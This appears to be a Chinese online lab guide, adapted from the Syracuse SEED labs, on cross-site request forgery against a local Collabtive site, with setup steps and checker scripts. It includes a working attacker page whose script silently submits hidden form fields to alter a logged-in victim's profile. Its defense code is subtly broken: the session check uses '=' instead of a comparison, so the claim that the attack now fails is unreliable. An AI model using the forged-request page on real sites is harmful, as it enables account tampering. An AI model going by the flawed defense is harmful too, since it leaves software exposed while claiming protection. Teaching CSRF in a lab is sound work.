---
show: step
version: 0.1
enable_checker: true
---

# Collabtive系统跨站请求伪造攻击实验

## 一、实验简介

**注意：进入实验需要等待一点时间才会出现界面，弹窗提示直接选择 `use default config` 按钮。** 

帮助学生理解跨站请求伪造(CSRF或XSRF)攻击。CSRF攻击涉及用户受害者,受信任的网站,恶意网站。受害者与受信任的站点和用户拥有一个活跃的会话同时访问恶意网站。恶意网站注入一个HTTP请求为受信任的站点到受害者用户会话牺牲其完整性。

## 二、实验背景

CSRF攻击总是涉及到三个角色:信赖的网站(Collabtive),受害者的session或cookie,和一个恶意网站。受害者会同时访问恶意网站与受信任的站点会话的时候。攻击包括一系列步骤，如下:

1. 受害者用户使用他/她的用户名和密码登录到可信站点,从而创建一个新的会话。
2. 受信任站点存储受害者会话的cookie或session在受害者用户的web浏览器端。
3. 受害者用户在不退出信任网站时就去访问恶意网站。
4. 恶意网站的网页发送一个请求到受害者的浏览器。
5. web浏览器将自动连接会话cookie,因为它是恶意的要求针对可信站点。
6. 受信任的站点如果受到CSRF攻击,攻击者的一些恶意的请求会被攻击者发送给信任站点。

恶意网站可以建立HTTP GET或POST请求到受信任的站点。一些HTML标签,比如img iframe,框架,形式没有限制的URL,可以在他们的使用属性中。img,iframe,框架可用于锻造GET请求。HTML表单标签可用于构造POST请求。构造GET请求是相对容易的,因为它甚至不需要JavaScript的帮助;构造POST请求需要JavaScript。因为Collabtive只针对后者,本实验室的任务将只涉及HTTP POST请求；


## 三、预备知识

### 什么是CSRF？

百度百科--[CSRF](http://baike.baidu.com/link?url=h64nEfsH4Ok8FiOlsEcJuO8UUzbBSy9MeepkimruEVTv0wE7gM54P-0C1tTlUlylwqUXKxK0NBSP6eeyT_Qt7_)
CSRF(Cross-site request forgery)：中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF；

作用：攻击者盗用了你的身份，以你的名义发送恶意请求；

危害：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全；

### 环境搭建

启动服务，由于`mysql_safe`不会退出，所以启动后该终端需要保留，在其他终端中执行后续命令：

```
sudo service apache2 start
sudo mysqld_safe
```

服务启动后的截图，请再打开其他终端执行后续命令。

![此处输入图片的描述](https://dn-anything-about-doc.qbox.me/document-uid13labid876timestamp1445515226388.png/wm)

配置DNS：

```
sudo vim /etc/hosts
```

````
127.0.0.1	www.csrflabattacker.com
127.0.0.1	www.csrflabcollabtive.com
````

![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077109376?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

网站配置：

在 /etc/apache2/conf.d 目录下新建 lab.conf 文件：

```bash
$ sudo vi /etc/apache2/conf.d/lab.conf
```

```
<VirtualHost *:80>
ServerName http://www.csrflabcollabtive.com
DocumentRoot /var/www/CSRF/Collabtive/
</VirtualHost>

<VirtualHost *:8080>
ServerName http://www.csrflabattacker.com
DocumentRoot /var/www/CSRF/Attacker/
</VirtualHost>
```

![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077233024?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

重启服务：

```bash
$ sudo service apache2 restart
```

这个时候我们就可以同时访问两个网站了~~~

```checker
- name: check hosts
  script: |
    #!/bin/bash
    grep csrflabattacker /etc/hosts
    grep csrflabcollabtive /etc/hosts
  error: 没有配置/etc/hosts文件
- name: check lab.conf
  script: |
    #!/bin/bash
    ls /etc/apache2/conf.d/lab.conf
    grep Attacker /etc/apache2/conf.d/lab.conf
    grep 8080 /etc/apache2/conf.d/lab.conf
  error: 没有lab.conf文件或者没有配置lab.conf文件
- name: check mysqld_safe
  script: |
    #!/bin/bash
    ps -ef |grep -v grep|grep mysqld_safe
  error: 没有启动mysqld_safe
- name: check apache2
  script: |
    #!/bin/bash
    ps -ef |grep -v grep|grep apache2
  error: 没有启动apache2
```

## 四、实验任务

实验环境介绍：第一个网站是脆弱的Collabtive网站www.csrflabcollabtive.com。第二个网站是攻击者的恶意网站www.csrflabattacker.com,用于攻击Collabtive。

### lab1 修改受害者的信息 

step1:在开始之前，需要安装 livehttpheader 插件。点击浏览器的 tools-》add-ons ，在搜索框输入 live http header 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。我这里是已经安装了，截图如下：

![3.4-1](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647286699.png-wm)

step2:访问 www.csrflabcollabtive.com并进行登录。

>用户：admin 密码：admin

step3:我们登陆了自己的用户，当我们希望可以修改别人的用户时，我们需要知道修改数据时的数据流，这个时候我们可以使用firefox浏览器的LiveHttpHeader插件来进行抓包获取修改用户时候的http消息；

点击菜单栏tools-LiveHttpHeader，然后访问编辑用户页面；

![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077485549?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)

填写一些信息，如下图所示：

![实验楼](https://dn-simplecloud.shiyanlou.com/87971525851500141-wm)

再点击 send 按钮。在我们的 livehttpheader 窗口中可以找到类似下图的内容：

![实验楼](https://dn-simplecloud.shiyanlou.com/87971525851451091-wm)

通过抓取的信息，我们可以得知：

验证 url 为 http://www.csrflabcollabtive.com/manageuser.php?action=edit，各信息的对应名称也能看到，比如 userfile，company 等等。

用户修改信息的方式是post提交，我们就需要自己构造一个危险页面。在 /var/www/CSRF/Attacker/ 文件夹下新建一个 index.html 文件，文件内容如下：

```
<html>

<body>
    <h1>
        This page forges an HTTP POST request.
    </h1>
    <script type="text/javascript">
        function post(url, fields) {
            //create a <form> element.
            var p = document.createElement("form");
            //construct the form
            p.action = url;
            p.innerHTML = fields;
            p.target = "_self";
            p.method = "post";
            //append the form to the current page.
            document.body.appendChild(p);
            //submit the form
            p.submit();
        }

        function csrf_hack() {
            var fields;
            // The following are form entries that need to be filled out
            // by attackers. The entries are made hidden, so the victim
            // won't be able to see them.
            fields += "<input type='hidden' name='name' value='admin' >"; 
            fields += "<input type='hidden' name='gender' value='female' >"; //修改性别
            fields += "<input type='hidden' name='company' value='seed' >"; //修改公司名
            post('http://www.csrflabcollabtive.com/manageuser.php?action=edit', fields);
        }
        // invoke csrf_hack() after the page is loaded.
        window.onload = function() {
            csrf_hack();
        }
    </script>
</body>

</html>
```

当用户没有退出，就去访问了www.csrflabattacker.com 就会对collabtive网站的用户信息进行修改；

再次查看用户信息，这个时候我们就会发现用户变成了我们的期望值了：

![实验楼](https://dn-simplecloud.shiyanlou.com/87971525851781473-wm)

#### 原理解析 

攻击者模拟一个页面进行自动提交，当用户访问这个页面时，相当于用户自己去修改信息，服务器不会判断是人发起的还是自动发起的，这个时候漏洞就产生了！

```checker
- name: check index.html
  script: |
    #!/bin/bash
    ls /var/www/CSRF/Attacker/index.html
    grep csrf_hack /var/www/CSRF/Attacker/index.html
  error: /var/www/CSRF/Attacker 目录下不存在 index.html 或内容不对
```

### lab2 对Collabtive实施防御对策 

服务端防御：防御CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数；

编辑验证文件

```
sudo vim /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl
```

选定一个位置添加如下代码：

```
<input type="hidden" name="sid" value="">
```

截图如下：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525852145590.png-wm)

在提交处，将 cookie 赋值给 sid。修改如下代码：

```
<button type="submit" onclick="this.form.sid.value=document.cookie" onfocus="this.blur()">{#send#    }</button>  //在 223 行
```

截图如下：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525852495137.png-wm)

按 `esc` 然后输入 `:wq` 保存并退出，然后修改 /var/www/CSRF/Collabtive/manageuser.php 文件，在里面添加如下代码：

```
$sid = getArrayVal($_POST,"sid");
```

截图如下：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525852797164.png-wm)

还需要添加如下代码：

```
if($_COOKIE["PHPSESSID"]=$sid){ //可以添加在 203 行处

} //注意这个闭合的花括号，添加位置在 275 行
```

截图如下：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525853375575.png-wm)

>  这一行是对用户s id 值进行判断，是否等于 phpsessid 的值，如果相等就可以进行对用户编辑，这样当攻击者想攻击时，就不能通过验证了；这里需要注意的是，if 需要对整个编辑内容进行判断；所以要注意括号闭合的位置，应该是 $action="edit" 整个内容；

然后我们再进行lab1中的实验，就会不成功了！

```checker
- name: check edituserform.tpl
  script: |
    #!/bin/bash
    sed -n "223p" /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl|grep onclick
  error: 没有修改 edituserform.tpl 文件
- name: check manageuser.php
  script: |
    #!/bin/bash
    grep sid /var/www/CSRF/Collabtive/manageuser.php 
    grep PHPSESSID /var/www/CSRF/Collabtive/manageuser.php 
  error: 没有修改 manageuser.php
```

#### 原理 

因为攻击者不能获得第三方的Cookie(理论上)

#### 思考--你能绕过这个对策? 

答案：这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢....由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就是另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了。但是如果需要100%的杜绝，这个不是最好的方法；

## 作业 

你需要提交一份详细的实验报告来描述你做了什么和你所学到的。

请提供使用LiveHTTPHeaders Wiresharkde 细节或屏幕截图。

## license 

本实验所涉及的实验环境来自[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)，并在此基础上为适配实验室我那工作环境进行修改，修改后的实验文档仍然遵循GUN Free Documentation License

附[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)版权说明：

Copyright 

 c 2006 - 2011 Wenliang Du, Syracuse University.
The development of this document is/was funded by three grants from the US National Science Foundation:
Awards No. 0231122 and 0618680 from TUES/CCLI and Award No. 1017771 from Trustworthy Computing.
Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free
Documentation License, Version 1.2 or any later version published by the Free Software Foundation. A copy
of the license can be found at http://www.gnu.org/licenses/fdl.html.








